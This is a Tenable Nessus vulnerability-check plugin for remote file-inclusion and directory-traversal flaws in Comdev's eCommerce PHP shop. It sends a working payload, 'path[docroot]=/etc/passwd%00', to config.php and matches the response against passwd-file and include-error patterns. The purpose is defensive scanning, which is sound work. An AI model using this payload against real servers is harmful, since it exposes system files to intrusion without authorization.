#
# (C) Tenable Network Security
#


if (description) {
  script_id(19393);
  script_version("$Revision: 1.6 $");

  script_cve_id("CVE-2005-2543", "CVE-2005-2544");
  script_bugtraq_id(14478, 14479);
  if (defined_func("script_xref")) {
    script_xref(name:"OSVDB", value:"18601");
  }

  name["english"] = "eCommerce Multiple Vulnerabilities";
  script_name(english:name["english"]);
 
  desc["english"] = "
Synopsis :

The remote web server contains a PHP application that is affected by
multiple vulnerabilities. 

Description :

The remote host is running eCommerce, a web-based shopping system from
Comdev. 

The installed version of eCommerce allows remote attackers to control
the 'path[docroot]' parameter used when including PHP code in the
'config.php' script.  By leveraging this flaw, an attacker may be able
to view arbitrary files on the remote host and execute arbitrary PHP
code, possibly taken from third-party hosts. 

There is also a directory traversal vulnerability in the product
involving the 'wce.download.php' script, by which an attacker can read
the contents of arbitrary files on the remote host. 

See also : 

http://www.securityfocus.com/archive/1/407469/30/0/threaded
http://www.securityfocus.com/archive/1/407473/30/0/threaded

Solution : 

Unknown at this time.

Risk factor : 

Medium / CVSS Base Score : 6
(AV:R/AC:H/Au:NR/C:P/A:P/I:P/B:N)";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for multiple vulnerabilities in eCommerce";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through CGI directories.
foreach dir (cgi_dirs()) {
  # Try to exploit the flaw in config.php to read /etc/passwd.
  req = http_get(
    item:string(
      dir, "/config.php?",
      "path[docroot]=/etc/passwd%00"
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(string:res, pattern:"root:.*:0:[01]:") ||
    # we get an error saying "failed to open stream" or "Failed opening".
    #
    # nb: this suggests magic_quotes_gpc was enabled but passing 
    #     remote URLs might still work.
    egrep(string:res, pattern:"Warning: main\(/etc/passwd.+failed to open stream") ||
    egrep(string:res, pattern:"Warning: .+ Failed opening '/etc/passwd.+for inclusion")
  ) {
    security_warning(port);
    exit(0);
  }
}
